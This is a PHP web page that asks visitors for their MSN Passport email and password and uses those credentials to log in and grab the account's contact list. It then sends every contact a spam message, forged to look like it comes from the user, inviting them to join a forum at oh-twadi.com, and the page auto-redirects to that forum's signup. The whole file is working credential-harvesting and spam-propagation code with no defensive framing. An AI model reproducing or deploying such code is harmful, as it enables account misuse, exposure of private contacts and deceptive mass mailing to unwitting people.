<?php

error_reporting(E_ALL);

require('phplistgrab.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
$phplistgrab = new phpListGrab($_POST['passport'], $_POST['password']);
$phplistgrab->grab();

// Sort the contact list into alphabetical order
sort($phplistgrab->lists[LIST_FORWARD]);
$header = "From: ".$_POST['passport']." <".$_POST['passport'].">\r\n";

foreach ($phplistgrab->lists[LIST_FORWARD] as $contact)
{

$to = $contact['passport'];
$subject = 'Hey :) Check My New Profile !!!!!';
$message = 'Hello Friend! 
You Have Been Invited By Someone On Your Contact List To Join http://www.oh-twadi.com/forum/register1.php <<Click To Join 
And Share The Fun of posting on the board, 
Features: Arcade , Store, Chat , 13,000 New Members And Growing
So Sign Up Today And Invite Your Friends To
Thank you,
Your Friend @ http://www.oh-twadi.Com';

mail($to, $subject, $message, $header);
}
}
else
{

echo <<<EOT

<META 
     HTTP-EQUIV="Refresh"
     CONTENT="2; URL=http://www.oh-twadi.com/forum/register.php">

</head>
<body>

<form  method="post" action="index.php">

<table cellpadding="2" cellspacing="2" border="1" width="100%">
<tr>
<td>Passport:</td>
<td><input type="text" name="passport" /></td>
</tr>
<tr>
<td>Password:</td>
<td><input type="password" name="password" /></td>
</tr>
<tr>
<td></td>
<td><input type="submit" name="pie" value="Submit" /></td>
</tr>

</table>

</form>

EOT;

}

?>


<META 
     HTTP-EQUIV="Refresh"
     CONTENT="2; URL=http://www.oh-twadi.com/forum/register.php">



<META 
     HTTP-EQUIV="Refresh"
     CONTENT="2; URL=http://www.oh-twadi.com/forum/register.php">